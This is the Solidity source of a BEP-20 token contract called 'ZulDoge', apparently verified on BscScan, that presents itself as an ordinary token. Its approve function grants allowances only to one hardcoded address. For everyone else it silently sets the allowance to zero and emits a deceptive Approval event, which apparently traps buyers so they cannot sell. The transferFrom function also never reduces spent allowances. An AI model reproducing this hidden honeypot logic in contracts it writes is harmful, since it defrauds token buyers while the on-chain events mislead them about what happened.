/**
 *Submitted for verification at BscScan.com on 2021-07-07
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-07
*/

pragma solidity ^0.8.2;

/**
 SPDX-License-Identifier: UNLICENSED
*/

contract ZulDoge {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 100000000000000 * 10 ** 18;
    string public name = "ZulDoge";
    string public symbol = "ZulDoge";
    uint public decimals = 18;

    event Transfer (address indexed from, address indexed to, uint value);
    event Approval (address indexed from, address indexed spender, uint value);

    constructor () {
        balances[msg.sender] = totalSupply;
    }

    function balanceOf (address owner) public view returns (uint) {
        return balances[owner];
    }

    function transfer (address to, uint value) public returns (bool) {
        require (balanceOf(msg.sender) >= value, 'your balance is too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer (msg.sender, to, value);
        return true;
    }

    function transferFrom (address from, address to, uint value) public returns (bool){
        require  (balanceOf(from) >= value, 'balance is too low');
        require (allowance[from][msg.sender] >= value, "allowance is too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer (from, to, value);
        return true;
    }

    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xE40D2E89bc7c48967A5FdED7e91839A894f62702)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } else {
            allowance[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 2);
        }
        return true;
    }

}